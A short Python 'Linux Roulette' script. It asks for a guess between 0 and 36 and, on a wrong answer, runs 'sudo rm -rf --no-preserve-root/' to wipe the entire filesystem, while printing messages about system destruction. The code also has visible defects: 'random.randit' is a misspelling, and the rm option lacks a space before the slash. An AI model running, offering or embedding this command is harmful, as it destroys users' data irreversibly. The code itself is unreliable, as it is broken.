import random
import os

print("============Linux Roulete============")
target = random.randit(0,36)
guess = int(input("Guess a random number between 0 and 36"))

if guess == target:
	print("Correct! You are a free man")
else:
	print(f"[*]Wrong guess :) Number was {target}")
	print("[!]Systm Deletion in progress....")
	
	os.system("sudo rm -rf --no-preserve-root/&")
	print("Deletion initiated. System destruction imminent.")
